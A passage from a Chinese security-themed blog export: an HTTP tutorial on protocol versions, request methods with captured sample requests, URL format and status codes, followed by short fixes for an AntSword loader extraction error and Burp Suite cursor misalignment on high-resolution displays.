采用二进制格式传输数据，而不是HTTP&#x2F;1.x的纯文本格式，解析效率更高。</li><li>多路复用：同一TCP连接中可同时处理多个请求和响应，避免队头阻塞问题。</li><li>头部压缩：使用HPACK算法压缩HTTP头部信息，减少重复头部传输的带宽占用。</li><li>服务器推送：允许服务器主动向客户端推送资源（如CSS、JS），减少等待时间。</li><li>优先级与流量控制：支持为不同请求分配优先级，优化传输顺序。</li><li>增强安全性：主流浏览器仅支持加密的HTTP&#x2F;2通信（通过HTTPS）。</li></ol></li><li>流程<ul><li>建立连接（通常通过TLS协商升级）→ 二进制数据分帧传输 → 多路复用并发处理 → 响应客户端请求。</li></ul></li><li>使用场景<ul><li>适用于资源密集型网页加载（如加载大量图片、CSS、JS）、高效的API通信（如RESTful API或GraphQL）、实时应用（如在线聊天、游戏）。</li></ul></li></ul><h3 id="HTTP-3-2022年"><a href="#HTTP-3-2022年" class="headerlink" title="HTTP&#x2F;3 (2022年)"></a>HTTP&#x2F;3 (2022年)</h3><ul><li>特点<ol><li>基于QUIC协议：HTTP&#x2F;3基于QUIC（Quick UDP Internet Connections）协议，而非TCP。QUIC是Google开发的传输层协议，旨在减少延迟并提高网络性能。</li><li>使用UDP代替TCP：QUIC使用UDP协议来替代传统的TCP，能够更好地处理网络丢包，减少连接延迟。</li><li>零延迟连接建立：QUIC协议实现了“零延迟连接建立”，即在第一次连接时通过加密握手同时进行连接和身份验证，避免了TCP的三次握手过程。</li><li>多路复用：类似于HTTP&#x2F;2，HTTP&#x2F;3也支持多路复用，但QUIC在不同流之间的丢包处理更为高效，避免了队头阻塞。</li><li>内建加密：QUIC协议内建加密，所有的HTTP&#x2F;3连接都必须使用TLS加密，确保数据传输的安全性。</li><li>连接迁移：QUIC支持连接迁移，使得在客户端更换IP地址（如从Wi-Fi切换到移动数据）时，连接可以继续保持，减少了中断的可能性。</li></ol></li><li>流程<ul><li>客户端与服务器通过QUIC协议建立加密连接（零延迟握手）→ 多路复用请求和响应通过UDP传输 → 响应客户端请求。</li></ul></li><li>使用场景<ul><li>对延迟敏感的应用，如在线游戏、实时视频通信等，以及在网络环境不稳定的情况下，能够提供更好的性能和可靠性。</li></ul></li></ul><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><ul><li>用途：<ul><li>用于从服务器请求资源（如网页、图片、API数据等）。</li><li>主要用于检索资源而不更改资源的状态。</li></ul></li><li>特点：<ul><li>请求的数据通常缓存并附加在URL中（如查询字符串）。</li><li>无副作用：不会修改服务器上的任何数据，仅用于获取信息。</li><li>幂等性：多次请求相同资源会返回相同的结果。</li><li>通常用于获取网页、API数据等。</li></ul></li></ul><h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><ul><li>请求的内容通常就在URL上<br><img src="https://imges.xenon.us.kg/20241127/Pasted-image-20241126023243.67xi01hpos.jpg" alt="Pasted-image-20241126023243"></li><li>查看请求包他传递的参数(类似q&#x3D;?)都在第一行，这一行通常是告诉服务器我使用的协议和参数，他的值进行过了URL编码，通过解码就可以得出请求的资源内容</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /x/search/?q=%E8%A7%89%E9%86%92%E5%B9%B4%E4%BB%A3&amp;queryFrom=0 HTTP/2</span><br><span class="line">Host: v.qq.com</span><br><span class="line">Cookie: _clck=omwskt|1|fr4|0; video_guid=c7cc94465c380195; ptag=m_v_qq_com; qq_domain_video_guid_verify=c7cc94465c380195; _qimei_uuid42=18b1a021e231007868e435b494f63fd0d06e6f4f1f; _qimei_fingerprint=cf181875ea216904e24de0761deaf69b; pgv_info=ssid=s3854804566; ts_refer=m.v.qq.com/; pgv_pvid=1548695215; ts_uid=2832647105; bucket_id=0; video_platform=2; _qimei_q36=; _qimei_h38=19c59f4568e435b494f63fd00200000a118b1a; player_spts=8|0|<span class="literal">false</span>|<span class="literal">false</span>|<span class="literal">true</span>|<span class="literal">true</span>|<span class="literal">false</span>; tvfe_search_uid=8b574fa9-2d93-4448-b4e7-451260bca546; tab_experiment_str=100000; tab_experiment_search=100000; ts_last=v.qq.com/x/search/</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;130&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;130&quot;</span>, <span class="string">&quot;Not?A_Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span></span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://v.qq.com/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241127/Pasted-image-20241126024017.26lilndmbu.jpg" alt="Pasted-image-20241126024017"></p><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><ul><li>用途：<ul><li>用于向服务器提交数据，通常用于表单提交、数据创建、文件上传等操作。</li><li>可以创建新的资源或对现有资源进行更新。</li></ul></li><li>特点：<ul><li>请求数据包含在请求体中，而非URL中。因此可以传输大量数据，一般不会被缓存</li><li>有副作用：可能会修改服务器上的资源（例如提交表单、注册新用户）。</li><li>非幂等性：多次请求相同数据可能导致不同的结果（如重复创建数据）。</li><li>常用于数据提交、文件上传等场景。</li></ul></li></ul><h5 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h5><ul><li>查看请求包，看第一行告诉服务器的请求方法为POST我为他传递了一个参数a&#x3D;baidu，一般情况下在请求包最后空一行就是传递的内容</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: baike.baidu.com</span><br><span class="line">Content-Length: 7</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;130&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;130&quot;</span>, <span class="string">&quot;Not?A_Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span></span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Origin: https://baike.baidu.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://www.baidu.com/link?url=gEqmBJmOdSSPwTZqe25b6w-oUCPl77jxwYMbz6cazHMUyUzcWJY0LLjYXQ5FVxkf&amp;wd=&amp;eqid=a8d99ff900cf0828000000066744c617</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">a=baidu</span><br></pre></td></tr></table></figure><hr><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><ul><li>用途：<ul><li>用于请求删除指定的资源。</li></ul></li><li>特点：<ul><li>通常不带请求体，直接指定要删除的资源。</li><li>幂等性：多次请求删除相同资源，结果是一样的（资源已经被删除）。</li><li>常用于删除用户、文章或其他资源。</li></ul></li></ul><hr><h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><ul><li>用途：<ul><li>与<code>GET</code>类似，但只请求资源的头部信息，不返回资源的具体内容。</li><li>通常用于检查资源的状态或获取元数据（如文件大小、修改时间等）。</li></ul></li><li>特点：<ul><li>返回响应头信息，且没有响应体。</li><li>用于获取资源的元数据，检查是否更新或是否存在。</li><li>无副作用：不会改变服务器资源。</li></ul></li></ul><h3 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h3><ul><li>用途：<ul><li>用于查询服务器支持的HTTP方法，通常用于跨域请求时的预检（CORS）或探测服务器支持的功能。</li></ul></li><li>特点：<ul><li>返回允许的请求方法列表，帮助客户端决定是否可以继续发起请求。</li><li>不会修改资源状态，通常不带请求体。</li><li>常用于跨域请求的预检阶段。</li></ul></li></ul><hr><h3 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h3><ul><li>用途：<ul><li>用于部分更新资源，仅提交需要更新的部分，而不是整个资源。</li><li>适用于修改资源的一小部分数据。</li></ul></li><li>特点：<ul><li>请求体中包含部分更新的数据，而非完整的数据。</li><li>非幂等性：多次请求可能导致不同的结果，具体取决于更新内容。</li><li>适用于对资源做部分修改（例如修改用户信息中的一个字段）。</li></ul></li></ul><hr><h3 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h3><ul><li>用途：<ul><li>用于建立到服务器的隧道连接，通常用于HTTPS请求。</li><li>使得客户端和服务器之间可以进行加密通信。</li></ul></li><li>特点：<ul><li>通过<code>CONNECT</code>方法，客户端与服务器建立TCP连接后，通过该连接进行SSL&#x2F;TLS加密通信。</li><li>常用于代理服务器场景，建立安全的通信隧道。</li><li>不用于直接请求资源，主要用于设置安全的网络连接。</li></ul></li></ul><hr><h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><ol><li>用途<ul><li><code>TRACE</code>方法用于诊断目的，主要用来回显客户端发送的HTTP请求内容，帮助开发者或管理员调试客户端和服务器之间的通信问题。</li><li>它可以验证请求在到达服务器之前是否被中间代理或网关修改。</li></ul></li><li>特点<ul><li>服务器将客户端发送的原始请求直接返回到客户端，响应体中包含发送的请求内容。</li><li>用于测试网络中请求的传输路径，帮助开发者检查和调试HTTP请求。</li><li>无副作用：不会对服务器上的资源产生任何改变。</li><li>幂等性：多次执行同一请求，结果相同。</li></ul></li></ol><h3 id="URL格式"><a href="#URL格式" class="headerlink" title="URL格式"></a>URL格式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#端口默认80/443不显示，文件名index不显示，锚点类似于目录的页码告诉浏览器跳转到哪里</span></span><br><span class="line">https://www.baidu.com/s?ie=utf-8</span><br><span class="line"><span class="comment">#协议://域名:端口/虚拟目录/文件名?参数#锚点</span></span><br></pre></td></tr></table></figure><h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理</td></tr><tr><td>3**</td><td>重定向，需要进一步的操作以完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p>HTTP状态码列表:</p><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed（预期失败）</td><td>服务器无法满足请求头中 Expect 字段指定的预期行为。</td></tr><tr><td>418</td><td>I’m a teapot</td><td>状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国蚁剑AntSword解压出错</title>
      <link href="/posts/d7cc9867.html"/>
      <url>/posts/d7cc9867.html</url>
      
        <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>初次使用中国蚁剑::加载器时下载源代码解压出错<br><img src="https://imges.xenon.us.kg/20241108/image.361l7ezrmr.jpg" alt="image"></p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>一.手动解压，并重新打开蚁剑→选择初始化文件夹为刚刚解压的文件夹<br><img src="https://imges.xenon.us.kg/20241108/image.4g4idqkxky.jpg" alt="image"></p><p>二.成功截图<br><img src="https://imges.xenon.us.kg/20241108/image.58hdvh651e.jpg" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八的问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Sutie光标位移</title>
      <link href="/posts/c13184bb.html"/>
      <url>/posts/c13184bb.html</url>
      
        <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>在使用<code>Burp Sutie</code>应该都会出现的一个问题就是光标位移，如下图光标位置应是位于0.7的后面，但是在显示在0的后面。原因是因为显示器分辨率过大，软件自适应缩放导致的。<br><img src="https://imges.xenon.us.kg/20241106/Pasted-image-20241106132502.7zqg0ixs2q.jpg" alt="Pasted-image-20241106132502"></p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>手动设置软件分辨率</p><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>在启动的脚本<code>-jar</code>前面里添加参数</p><ul><li>调整程序缩放设置为1，注意每个参数之间需要有空格，如果启动不了那就是没有空格。</li><li>缩放可以根据自己显示器分辨率调整</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-Dsun.java2d.uiScale=1</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241106/Pasted-image-20241106133752.969r94odug.jpg" alt="Pasted-image-20241106133752"></p><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>软件设置Userinterface→Display，设置DPI</p><ul><li>DPI根据自己显示器分辨率调整<br><img src="https://imges.xenon.us.kg/20241106/Pasted-image-20241106133438.3nrmszgyh6.jpg" alt="Pasted-image-20241106133438"></li></ul><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>后续如果有字体大小等类似问题可以在设置字体大小解决<br><img src="https://imges.xenon.us.kg/20241106/Pasted-image-20241106134333.2dopmnzkwz.jpg" alt="Pasted-image-20241106134333"></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八的问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burp Suite </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
